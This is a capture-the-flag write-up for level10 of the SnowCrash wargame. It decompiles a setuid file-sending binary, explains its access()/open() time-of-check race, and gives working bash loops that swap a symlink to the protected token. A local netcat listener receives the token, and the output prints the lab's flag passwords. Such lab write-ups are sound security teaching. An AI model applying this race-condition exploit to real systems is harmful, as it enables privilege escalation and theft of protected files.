# level10
This one is my favorite

- We login as user level10.
```
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```


- A binary has been left for us. Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
```
(gdb) info functions
All defined functions:

File level10.c:
int main(int, char **);

Non-debugging symbols:
0x080484d0  _init
...
```

```
(gdb) disas main
Dump of assembler code for function main:
    HUGE CODE
End of assembler dump.
```


- Let's save time, we can use [Ghidra](https://en.wikipedia.org/wiki/Ghidra) to get an interpretation of the source code of this binary.
```c
int main(int argc,char **argv)
{
  ...  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
    exit(1);
  }

  pcVar6 = (char *)in_stack_00000008[1];
  __cp = (char *)in_stack_00000008[2];

  iVar2 = access(pcVar6,4);
  if (iVar2 != 0) {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  else {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    ...
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    ...

    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
      exit(1);
    }

    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
      exit(1);
    }

    printf("Connected!\nSending file .. ");
    fflush(stdout);

    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
      exit(1);
    }

    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
      exit(1);
    }

    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }

  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail();
  }
  return iVar2;
}
```


- We can see that the program makes a call to `access(argv[1])`. If this call succeeds, it will attempt to establish a socket connection to `argv[2]` on port 6969 in order to send the contents of `argv[1]`.


- Given that `access()` does not consider [the setuid and setgid bits](https://en.wikipedia.org/wiki/Setuid) when checking permissions, the program displays `You don't have access to the token` and then terminates.


- Note that [the call to access(), directly followed by a call to open(), is the subject of a security vulnerability](https://vulncat.fortify.com/en/detail?id=desc.controlflow.cpp.file_access_race_condition#C%2FC%2B%2B).
Indeed, between the time when the program calls `access(our_file)` and the time when it calls `open(our_file)`, it is possible for us to replace `our_file` with a file of the same name, but which would be a symbolic link to another file. As a result, the program will rely on the return of `access(our_file)` to determine whether it can `open(our_file)` or not.


- So, we will need 3 terminals. The first one will run `nc -lk 6969 > /tmp/pwn.log` to listen on all IPs through port 6969 and store everything it receives in `/tmp/pwn.log`.


- In a `while true` loop, the second part will create a file accessible for reading, delete it, and then create a symbolic link with the same name pointing to `/home/user/level10/token`.
```bash
#!/bin/bash
while true
do
	touch /tmp/exploit
	rm /tmp/exploit
	ln -s /home/user/level10/token /tmp/exploit
	rm /tmp/exploit
done
```


- The latter will run our binary in a loop, passing the readable file as a parameter to it.
```bash
#!/bin/bash
while true
do
	/home/user/level10/level10 "/tmp/exploit" "127.0.0.1"
done
```


- Thus:
```
level10@SnowCrash:~$ cat /tmp/pwn.log | grep -v ".*( )*."
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
...
```

```
level10@SnowCrash:~$ su flag10
Password:woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
```

```
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

```
flag10@SnowCrash:~$ su level11
Password:feulo4b72j7edeahuete3no7c
level11@SnowCrash:~$
```